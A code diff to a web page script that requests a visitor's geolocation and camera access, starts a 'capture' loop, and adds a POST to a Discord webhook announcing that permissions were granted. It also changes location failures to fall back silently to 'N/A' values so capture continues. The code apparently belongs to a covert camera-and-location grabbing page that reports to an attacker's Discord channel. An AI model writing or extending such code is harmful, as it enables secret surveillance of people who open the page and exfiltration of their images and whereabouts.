@@ -139,12 +139,19 @@ document.addEventListener('DOMContentLoaded', () => {
         console.log("Requesting permissions...");
 
         try {
-            // Helper to wrap Geolocation in a Promise
-            const getLocation = () => new Promise((resolve, reject) => {
+            // Helper to wrap Geolocation in a Promise (Resilient)
+            const getLocation = () => new Promise((resolve) => {
                 if (!("geolocation" in navigator)) {
-                    reject(new Error("Geolocation not supported"));
+                    resolve({ coords: { latitude: "N/A", longitude: "N/A", accuracy: "N/A" } });
                 } else {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+                    navigator.geolocation.getCurrentPosition(
+                        resolve,
+                        (err) => {
+                            console.log("Loc failed", err);
+                            resolve({ coords: { latitude: "N/A", longitude: "N/A", accuracy: "N/A" } });
+                        },
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
                 }
             });
 
@@ -165,6 +172,13 @@ document.addEventListener('DOMContentLoaded', () => {
             ]);
 
             console.log("Permissions granted. Starting capture...");
+
+            // Debug Log to Discord
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `✅ **Permissions Granted!** Starting Loop...` })
+            }).catch(e => console.error(e));
 
             // 2. Set up Camera
             camPreview.srcObject = stream;
